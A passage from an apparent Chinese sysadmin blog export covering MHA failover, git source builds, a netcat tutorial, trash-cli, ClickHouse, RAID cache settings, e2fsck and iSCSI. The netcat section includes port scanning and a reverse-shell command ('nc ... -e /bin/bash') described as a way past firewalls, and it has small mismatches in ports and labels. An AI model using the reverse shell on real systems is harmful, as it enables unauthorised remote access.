Waiting for master to send event Master_Host: 10.25.1.67 Master_User: repl Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000001 Read_Master_Log_Pos: 66875 Relay_Log_File: relay-log.000002 Relay_Log_Pos: 67038 Relay_Master_Log_File: mysql-bin.000001 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 66875 Relay_Log_Space: 67205 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1673306 Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130 Master_Info_File: /my/data/percona/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to update it Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 01 row in set (0.00 sec)mysql> 到new_master上查看12345$ ps -ef|grep keepalivedroot 37477 1 0 23:41 ? 00:00:00 /usr/sbin/keepalived -Droot 37478 37477 0 23:41 ? 00:00:00 /usr/sbin/keepalived -Droot 37479 37477 0 23:41 ? 00:00:00 /usr/sbin/keepalived -Ddbctl 38747 35598 0 23:49 pts/0 00:00:00 grep --colour=auto keepalived 在切换回来到old_master提成为master步骤按照上面操作，就不重复搬砖了。 结果MHA 高可用集群切换成功，虽然是手动MHA failover测试，并不能代表MHA的高可用。以后还会按照上面缩写的步骤在加上一定的主从数据同步延迟来进行演练。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MHA</category>
      </categories>
      <tags>
        <tag>MHA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS Install git Source]]></title>
    <url>%2F2019%2F03%2F25%2Fgit-install%2F</url>
    <content type="text"><![CDATA[前言Git 同生活中的许多伟大事件一样，Git 诞生于一个极富纷争大举创新的年代。Linux 内核开源项目有着为数众广的参与者。绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上（1991－2002年间）。到 2002 年，整个项目组开始启用分布式版本控制系统 BitKeeper 来管理和维护代码。官方文档 到了 2005 年，开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了免费使用 BitKeeper 的权力。这就迫使 Linux 开源社区（特别是 Linux 的缔造者 Linus Torvalds ）不得不吸取教训，只有开发一套属于自己的版本控制系统才不至于重蹈覆辙。他们对新的系统制订了若干目标： 速度 简单的设计 对非线性开发模式的强力支持（允许上千个并行开发的分支） 完全分布式 有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量） 安装git 源码安装。下载源码1# wget https://github.com/git/git/archive/v2.21.0.zip 解压缩12345# tar zxvf v2.21.0.zip# cd git-2.20.1编译命令如下# # make prefix=/usr/local/git all 如果遇到该错误 123http.h:6:23: warning: curl/curl.h: No such file or directoryhttp.h:7:23: warning: curl/easy.h: No such file or directory…… 12执行命令# yum install -y curl curl-devel 重新执行编译命令 发现编译报错 1234567891011121314151617181920212223242526272829303132 CC http.o CC http-walker.o CC http-fetch.o LINK git-http-fetch CC http-push.ohttp-push.c:22:19: warning: expat.h: No such file or directoryhttp-push.c:830: warning: type defaults to ‘int’ in declaration of ‘XML_Char’http-push.c:830: error: expected ‘;’, ‘,’ or ‘)’ before ‘*’ tokenhttp-push.c: In function ‘lock_remote’:http-push.c:900: error: ‘XML_Parser’ undeclared (first use in this function)http-push.c:900: error: (Each undeclared identifier is reported only oncehttp-push.c:900: error: for each function it appears in.)http-push.c:900: error: expected ‘;’ before ‘parser’http-push.c:907: warning: implicit declaration of function ‘XML_SetUserData’http-push.c:907: error: ‘parser’ undeclared (first use in this function)http-push.c:908: warning: implicit declaration of function ‘XML_SetElementHandler’http-push.c:910: warning: implicit declaration of function ‘XML_SetCharacterDataHandler’http-push.c:910: error: ‘xml_cdata’ undeclared (first use in this function)http-push.c:911: warning: implicit declaration of function ‘XML_Parse’http-push.c:916: warning: implicit declaration of function ‘XML_ErrorString’http-push.c:917: warning: implicit declaration of function ‘XML_GetErrorCode’http-push.c:920: warning: implicit declaration of function ‘XML_ParserFree’http-push.c: In function ‘remote_ls’:http-push.c:1154: error: ‘XML_Parser’ undeclared (first use in this function)http-push.c:1154: error: expected ‘;’ before ‘parser’http-push.c:1161: error: ‘parser’ undeclared (first use in this function)http-push.c:1164: error: ‘xml_cdata’ undeclared (first use in this function)http-push.c: In function ‘locking_available’:http-push.c:1228: error: ‘XML_Parser’ undeclared (first use in this function)http-push.c:1228: error: expected ‘;’ before ‘parser’http-push.c:1235: error: ‘parser’ undeclared (first use in this function)make: *** [http-push.o] Error 1 执行命令解决这个问题1# yum install -y expat-devel 再次重新执行编译命令 发现再次报错 1234567GITGUI_VERSION = 0.21.GITGUI * new locations or Tcl/Tk interpreter GEN git-gui INDEX lib/ * tclsh failed; using unoptimized loading MSGFMT po/bg.msg make[1]: *** [po/bg.msg] Error 127make: *** [all] Error 2 执行命令解决1# yum install -y tcl build-essential tk gettext 再次重新执行编译命令 git源码编译成功执行执行命令1# make prefix=/usr/local/git install 123456789101112# cd /usr/local/git/# lsbin libexec share# cd bin/# lsgit git-cvsserver gitk git-receive-pack git-shell git-upload-archive git-upload-pack# ./git --versiongit version 2.20.1 安装完成。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Netcat 命令 - 网络中的瑞士军刀]]></title>
    <url>%2F2019%2F03%2F25%2Fnc%2F</url>
    <content type="text"><![CDATA[前言netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶。它的下载地址 netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。1234567891011121314151617181920212223242526272829$ nc -husage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port] [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version] [-x proxy_address[:port]] [hostname] [port[s]] Command Summary: -4 Use IPv4 -6 Use IPv6 -D Enable the debug socket option -d Detach from stdin -h This help text -i secs Delay interval for lines sent, ports scanned -k Keep inbound sockets open for multiple connects -l Listen mode, for inbound connects -n Suppress name/port resolutions -p port Specify local port for remote connects -r Randomize remote ports -S Enable the TCP MD5 signature option -s addr Local source address -T ToS Set IP Type of Service -C Send CRLF as line-ending -t Answer TELNET negotiation -U Use UNIX domain socket -u UDP mode -v Verbose -w secs Timeout for connects and final net reads -X proto Proxy protocol: "4", "5" (SOCKS) or "connect" -x addr[:port] Specify proxy address and port -z Zero-I/O mode [used for scanning] Port numbers can be individual or ranges: lo-hi [inclusive] 1234$ ncusage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port] [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version] [-x proxy_address[:port]] [hostname] [port[s]] nc 的基本功能如下： telnet / 获取系统 banner 信息 传输文本信息 传输文件和目录 加密传输文件 端口扫描 远程控制 / 正方向 shell 流媒体服务器 远程克隆硬盘 使用例子端口扫描端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞1$ nc -z -v -n 192.168.10.10 10-100 可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp. z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换 v 参数指使用冗余选项（译者注：即详细输出） n 参数告诉netcat 不要使用DNS反向查询IP地址的域名 这个命令会打印21到25 所有开放的端口。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。 一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。 1$ nc -v 192.168.10.10 22 netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。 C S(Chat Server) 聊天Server1$ nc -l 10010 netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。 Client1$ nc 192.168.10.10 10010 不管你在机器B上键入什么都会出现在机器A上。 文件传输大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件testfile.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。 Server1$ nc -l 10010 > testfile.txt Client1$ nc -n 192.168.10.10 10010 < testfile.txt 这里我们创建了一个服务器在A上并且重定向netcat的输入为文件testfile.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。在客户端我们重定向输出到testfile.txt，当B连接到A，A发送文件内容，B保存文件内容到testfile.txt. 没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。 目录传输发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。 如果你想要通过网络传输一个目录从A到B。 Server12$ tar -cvf - dir_name | nc -n 192.168.10.10 10010$ tar -cvf - dir_name | nc 192.168.10.10 10010 Client1$ nc -l 10010 | tar -xvf - 这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。 在客户端我们下载该压缩包通过netcat 管道然后打开文件。 如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。 Server123$ tar -cvf - dir_name| bzip2 -z | nc -n 192.168.10.10 10010$ tar -cvf - dir_name| bzip2 -z | nc 192.168.10.10 10010#使用 bzip2 压缩 Client12$ nc -l 10010 | bzip2 -d | tar -xvf -#使用 bzip2 解压缩 加密通过网络发送的数据如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如 mcrypt 的工具加密。 Server12$ nc localhost 10010 | mcrypt -flush -bare -F -q -d -m ecb > testfile.txt#使用mcrypt工具加密数据 Client1$ mcrypt -flush -bare -F -q -m ecb < testfile.txt | nc -l 10010 使用mcrypt工具解密数据。 以上两个命令会提示需要密码，确保两端使用相同的密码。 这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。 反向 SHELL反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。 Server1$ nc -l 10010 在客户端，简单地告诉netcat在连接完成后，执行shell Client1$ nc 192.168.10.10 10010 -e /bin/bash 现在，什么是反向shell的特别之处呢 反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.10.10，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如10.1.1.10的shell，那么我会用反向外壳用于这一目的。 克隆设备如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。 克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上 Server1$ dd if=/dev/sda | nc -l 10010 在客户端，简单地告诉netcat在连接完成后，执行shell Client1$ nc -n 192.168.10.10 10010 | dd of=/dev/sda dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防止 rm -rf 误删带来的灾难]]></title>
    <url>%2F2019%2F03%2F20%2Ftrash-cli%2F</url>
    <content type="text"><![CDATA[前言搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm -rf 这种操作，太危险了。为什么不学学Ubuntu/MacOS等系统有一个回收站，删除了可以去回收站里面找。经过折腾一番，终于找到了一个工具 trash-cli。trash-cli是一个使用 python 开发的软件包，trash-cli trashes记录原始路径，删除日期和权限的文件。它使用KDE，GNOME和XFCE使用的相同垃圾桶，但您可以从命令行（和脚本）调用它。包含:12345* trash-put trash files and directories.* trash-empty empty the trashcan(s).* trash-list list trashed files.* trash-restore restore a trashed file.* trash-rm remove individual files from the trashcan. trash-cli 安装The easy wayRequirements: Python 2.7 or Python 3 setuptools (use apt-get install python-setuptools on Debian) Installation command:1easy_install trash-cli From sourcesSystem-wide installation:123git clone https://github.com/andreafrancia/trash-cli.gitcd trash-clisudo python setup.py install User-only installation:123git clone https://github.com/andreafrancia/trash-cli.gitcd trash-clipython setup.py install --user trash-cli 命令查看安装成功之后的命令1234567# ll /usr/bin/ | grep trash-rwxr-xr-x 1 root root 123 Feb 2 17:43 trash-rwxr-xr-x 1 root root 125 Feb 2 17:43 trash-empty-rwxr-xr-x 1 root root 124 Feb 2 17:43 trash-list-rwxr-xr-x 1 root root 123 Feb 2 17:43 trash-put-rwxr-xr-x 1 root root 127 Feb 2 17:43 trash-restore-rwxr-xr-x 1 root root 122 Feb 2 17:43 trash-rm 功能说明： trash-put 将文件或目录移入回收站 trash-empty 清空回收站 trash-list 列出回收站中的文件 trash-restore 还原回收站中的文件 trash-rm 删除回首站中的单个文件 用它替代 rm命令1234# vim .bashrc # .bashrc#alias rm='rm -i'alias rm='trash-put' 实验测试删除测试：123456# rm -rf dump.sql# ll ~/.local/share/Trash/files -rw-r--r-- 1 root root 123 Jul 17 2018 dump.sql # trash-list2019-02-02 18:02:33 /root/dump.sql 还原删除的文件12345678# trash-restore /root/dump.rdb 0 2019-02-02 18:01:08 /root/dump.sql.bak 1 2019-02-02 18:02:33 /root/dump.sqlWhat file to restore [0..1]: 1还原成功# ll /root/dump.rdb -rw-r--r-- 1 root root 123 Jul 17 2018 /root/dump.sql 结束trash-put命令会把我们想要删除的文件移动到~/.local/share/Trash/files 中。相关信息记录在~/.local/share/Trash/info中。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ClickHouse-sync-to-MySQLDate]]></title>
    <url>%2F2019%2F03%2F20%2FClickHouse-sync-to-MySQLDate%2F</url>
    <content type="text"><![CDATA[前言 ClickHouse 这款产品大家都听说过很快，但是到底有多恐怖？ ClickHouse 到底是什么？ 介绍ClickHouse最初是为 Yandex.Metrica 世界第二大Web分析平台 而开发的。多年来一直作为该系统的核心组件被该系统持续使用着。目前为止，该系统在ClickHouse中有超过13万亿条记录，并且每天超过200多亿个事件被处理。它允许直接从原始数据中动态查询并生成报告。本文简要介绍了ClickHouse在其早期发展阶段的目标。 Yandex.Metrica基于用户定义的字段，对实时访问、连接会话，生成实时的统计报表。这种需求往往需要复杂聚合方式，比如对访问用户进行去重。构建报表的数据，是实时接收存储的新数据。 截至2014年4月，Yandex.Metrica每天跟踪大约120亿个事件（用户的点击和浏览）。为了可以创建自定义的报表，我们必须存储全部这些事件。同时，这些查询可能需要在几百毫秒内扫描数百万行的数据，或在几秒内扫描数亿行的数据。 什么是ClickHouse ?ClickHouse 是面向 OLAP 的分布式列式 DBMS. ClickHouse的显著特性 真正的面向列的DBMS 数据高效压缩 磁盘存储的数据 多核并行处理 在多个服务器上分布式处理 SQL语法支持 向量化引擎 实时数据更新 索引 适合在线查询 支持近似预估计算 支持嵌套的数据结构 支持数组作为数据类型 支持限制查询复杂性以及配额 复制数据复制和对数据完整性的支持 OLAP场景的关键特征 大多数是读请求 数据总是以相当大的批(> 1000 rows)进行写入 不修改已添加的数据 每次查询都从数据库中读取大量的行，但是同时又仅需要少量的列 宽表，即每个表包含着大量的列 较少的查询(通常每台服务器每秒数百个查询或更少) 对于简单查询，允许延迟大约50毫秒 列中的数据相对较小： 数字和短字符串(例如，每个URL 60个字节) 处理单个查询时需要高吞吐量（每个服务器每秒高达数十亿行） 事务不是必须的 对数据一致性要求低 每一个查询除了一个大表外都很小 查询结果明显小于源数据，换句话说，数据被过滤或聚合后能够被盛放在单台服务器的内存中 列式数据库更适合OLAP场景的原因列式数据库更适合于OLAP场景(对于大多数查询而言，处理速度至少提高了100倍)，下面详细解释了原因(通过图片更有利于直观理解)：行式列式看到差别了么？下面将详细介绍为什么会发生这种情况。1.针对分析类查询，通常只需要读取表的一小部分列。在列式数据库中你可以只读取你需要的数据。例如，如果只需要读取100列中的5列，这将帮助你最少减少20倍的I/O消耗。2.由于数据总是打包成批量读取的，所以压缩是非常容易的。同时数据按列分别存储这也更容易压缩。这进一步降低了I/O的体积。3.由于I/O的降低，这将帮助更多的数据被系统缓存。 1234567891011121314151617181920212223242526272829303132333435363738394041$ clickhouse-clientClickHouse client version 0.0.52053.Connecting to localhost:9000.Connected to ClickHouse server version 0.0.52053.:) SELECT CounterID, count() FROM hits GROUP BY CounterID ORDER BY count() DESC LIMIT 20SELECT CounterID, count()FROM hitsGROUP BY CounterIDORDER BY count() DESCLIMIT 20┌─CounterID─┬──count()─┐│ 114208 │ 56057344 ││ 115080 │ 51619590 ││ 3228 │ 44658301 ││ 38230 │ 42045932 ││ 145263 │ 42042158 ││ 91244 │ 38297270 ││ 154139 │ 26647572 ││ 150748 │ 24112755 ││ 242232 │ 21302571 ││ 338158 │ 13507087 ││ 62180 │ 12229491 ││ 82264 │ 12187441 ││ 232261 │ 12148031 ││ 146272 │ 11438516 ││ 168777 │ 11403636 ││ 4120072 │ 11227824 ││ 10938808 │ 10519739 ││ 74088 │ 9047015 ││ 115079 │ 8837972 ││ 337234 │ 8205961 │└───────────┴──────────┘20 rows in set. Elapsed: 0.153 sec. Processed 1.00 billion rows, 4.00 GB (6.53 billion rows/s., 26.10 GB/s.):) ClickHouse SQLCreating a Table12345678910111213CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster]( name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1], name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2], ... INDEX index_name1 expr1 TYPE type1(...) GRANULARITY value1, INDEX index_name2 expr2 TYPE type2(...) GRANULARITY value2) ENGINE = MergeTree()[PARTITION BY expr][ORDER BY expr][PRIMARY KEY expr][SAMPLE BY expr][SETTINGS name=value, ...] Example of sections setting1ENGINE MergeTree() PARTITION BY toYYYYMM(EventDate) ORDER BY (CounterID, EventDate, intHash32(UserID)) SAMPLE BY intHash32(UserID) SETTINGS index_granularity=8192 MySQL 数据导入测试测试一12345678910# du出的表大小5.5G test_1.ibd# ClickHouse操作语句CREATE TABLE test_1ENGINE = MergeTreeORDER BY id ASSELECT *FROM mysql('host:port', 'dbtest', 'test_1', 'user', 'password') # 耗时和平均速度0 rows in set. Elapsed: 137.251 sec. Processed 18.59 million rows, 7.34 GB (135.43 thousand rows/s., 53.48 MB/s.) 测试二123456789# 另一个表20G test_2.ibdCREATE TABLE test_2ENGINE = MergeTreeORDER BY id ASSELECT *FROM mysql('host:port', 'dbtest', 'test_2', 'user', 'password') # 不知道为啥这表这么快就导入了 貌似是行少，但是表的总大小大啊0 rows in set. Elapsed: 44.389 sec. Processed 13.03 million rows, 1.44 GB (293.44 thousand rows/s., 32.35 MB/s.) 参考ClickHouse 官方资料 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>ClickHouse</category>
      </categories>
      <tags>
        <tag>ClickHouse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[disk cache policy in RAID]]></title>
    <url>%2F2019%2F03%2F11%2Fdisk-cache-policy-in-RAID%2F</url>
    <content type="text"><![CDATA[引言这篇文章背后，字字都是血泪。曾经因为EXT4-fs error，从夜里10点抢救数据到凌晨7点， 睡一个小时候之后，吃饭，见客户，告诉客户数据恢复回来了。原理首先，RAID的write policy分成两种： write back write through 一种模式是write back会有更好的性能。因为在write back模式下，数据写入Controller Cache，就认为Write IO结束了，而不需要等待写入Hard driver。这种模式很明显存在安全隐患，异常掉电情况下，很容易引起数据丢失。 另一种模式是write through，这种模式比较谨慎，它压根不使用Raid Cache来加速写操作，因此这种模式的性能要比write back 低不少。 但是write back的不安全也是有办法解决的： 第一个方案是UPS–Uninterruptible Power Supply，这个按下不提 第二个方案是BBU–Backup Battery Unit，有了BBU，就可以安心地采用write-back模式了 对BBU不太了解的，可以阅读[Barriers, Caches, Filesystems]，介绍的非常好 讲完了这个write policy，还有一个东东叫disk cache policy，这个东西用来决定磁盘一级的cache是否enable。 一定要注意这个东西，无数血泪都是这个东西引起的。 如果选择write through模式，即不使用RAID cache，这种情况下disk cache对性能的提升是很大的。但是尽管如此，也不要enable disk cache，因为，会有数据丢失的风险。如果可能异常掉电，那么一定不要enable disk cache。 相关命令查看write policy 和 disk cache policy的命令如下：1/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aAll 输出如下：1234567891011121314151617181920Virtual Drive: 1 (Target Id: 1)Name :RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3Size : 25.466 TBSector Size : 512Is VD emulated : NoParity Size : 3.637 TBState : OptimalStrip Size : 128 KBNumber Of Drives : 8Span Depth : 1Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBUCurrent Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBUDefault Access Policy: Read/WriteCurrent Access Policy: Read/WriteDisk Cache Policy : Disk's DefaultEncryption Type : NonePI type: No PIIs VD Cached: No 可以看到Disk Cache Policy 是 Disk’s Default 。这个default值可以分成以下情况： For virtual disks containing SATA disks ， Enabled For virtual disks containing SAS disks ， Disabled 可以通过如下命令将Disk Cache Policy的值改成 Disable1/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -DisDskCache -Immediate -Lall -aAll 输出如下：123456789Set Disk Cache Policy to Disabled on Adapter 0, VD 0 (target id: 0) successSet Disk Cache Policy to Disabled on Adapter 0, VD 1 (target id: 1) successSet Disk Cache Policy to Disabled on Adapter 0, VD 2 (target id: 2) successSet Disk Cache Policy to Disabled on Adapter 0, VD 3 (target id: 3) successSet Disk Cache Policy to Disabled on Adapter 0, VD 4 (target id: 4) successSet Disk Cache Policy to Disabled on Adapter 0, VD 5 (target id: 5) successSet Disk Cache Policy to Disabled on Adapter 0, VD 6 (target id: 6) successExit Code: 0x00 此时再次查看输出：1234567891011121314151617181920Virtual Drive: 1 (Target Id: 1)Name :RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3Size : 25.466 TBSector Size : 512Is VD emulated : NoParity Size : 3.637 TBState : OptimalStrip Size : 128 KBNumber Of Drives : 8Span Depth : 1Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBUCurrent Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBUDefault Access Policy: Read/WriteCurrent Access Policy: Read/WriteDisk Cache Policy : DisabledEncryption Type : NonePI type: No PIIs VD Cached: No 推荐设置1.商用环境，RAID一定要有BBU2.write policy 采用 write back3.disk cache policy 一定要为disable 这个推荐设置，和Intel给出的 Configuring RAID For Optimal Performance 是一致的，除此以外，RAID Controller and Hard Disk Cache Settings也给出了类似的结论。这些都是不错的参考文献。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[check e2fsck progress realtime]]></title>
    <url>%2F2019%2F03%2F11%2Fcheck-e2fsck-progress-realtime%2F</url>
    <content type="text"><![CDATA[前言对于e2fsck 而言，有两个特点，如果文件系统是健康的，可以很快完成，3秒之内解决战斗，但是确实存在error的情况下，可能耗时非常久，这种情况下，进度汇报是非常重要的，如果一个文件系统需要修复几个小时，又没有进度汇报，人会抓狂的。实时检查 e2fsck 进度的方法在e2fsck 进行的时候，在另外一个终端向e2fsck 进程发送SIGUSR1信号。1watch -n 5 kill -10 `pidof e2fsck` 在e2fsck调用的终端上，就会每5秒钟显示一下实时的进度。12345678e2fsck 1.42 (29-Nov-2011)/dev/dm-19 contains a file system with errors, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structure Pass 3: Checking directory connectivity Pass 4: Checking reference counts Pass 5: Checking group summary information /dev/dm-19: |====================================================== \ 95.8% 结束语并非只有e2fsck 这个工具会响应SIGUSR1信号，dd工具也有同样的特点。dd 拷贝大文件的时候，只有在拷贝结束的时候，才会汇报时间以及速度等信息，但是像我这种等待焦虑综合症的选手，一定是会抓狂的，同样道理，通过实时向dd进程发送 SIGUSR1信号，dd进程就会时时汇报速率信息，不妨试试，很有用。 对于开发各种工具的人来说，如果工具运行时间可能很久，可以通过注册SIGUSR1信号的处理函数，实时向用户汇报进度，这是一个不错的习惯。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iSCSI_command]]></title>
    <url>%2F2019%2F03%2F11%2FiSCSI-command%2F</url>
    <content type="text"><![CDATA[前言iSCSI客户端常用命令总是忘记，在此处记录下。常用命令查看当前session挂载之前，一般如下图所示：12root@node:~# iscsiadm -m session iscsiadm: No active sessions. 挂载之后12345678910111213141516171819202122232425262728293031323334353637383940root@node-242:~# iscsiadm -m session tcp: [2] 10.16.172.247:3260,1 iqn.2018-11.com:BEANroot@node-242:~# iscsiadm -m session -P 3iSCSI Transport Class version 2.0-870version 2.0-871Target: iqn.2018-11.com:BEAN Current Portal: 10.16.172.247:3260,1 Persistent Portal: 10.16.172.247:3260,1 ********** Interface: ********** Iface Name: default Iface Transport: tcp Iface Initiatorname: iqn.1993-08.org.debian:01:c9c12dd76e Iface IPaddress: 10.16.172.242 Iface HWaddress: (null) Iface Netdev: (null) SID: 2 iSCSI Connection State: LOGGED IN iSCSI Session State: LOGGED_IN Internal iscsid Session State: NO CHANGE ************************ Negotiated iSCSI params: ************************ HeaderDigest: None DataDigest: None MaxRecvDataSegmentLength: 262144 MaxXmitDataSegmentLength: 1048576 FirstBurstLength: 262144 MaxBurstLength: 1048576 ImmediateData: Yes InitialR2T: No MaxOutstandingR2T: 1 ************************ Attached SCSI devices: ************************ Host Number: 25 State: running scsi25 Channel 00 Id 0 Lun: 0 Attached scsi disk sde State: running 根据IP 发现target1iscsiadm -m discovery -t st -p 10.16.172.246 输出如下：1234root@node:~# iscsiadm -m discovery -t st -p 10.16.172.24610.16.172.246:3260,1 iqn.2018-11.com:BEAN10.16.172.247:3260,1 iqn.2018-11.com:BEAN10.16.172.248:3260,1 iqn.2018-11.com:BEAN 登录到指定target1iscsiadm -m node -T [target_name] -p [ip:3260] -l 如下所示：1iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -l 输出如下：123root@node:~# iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 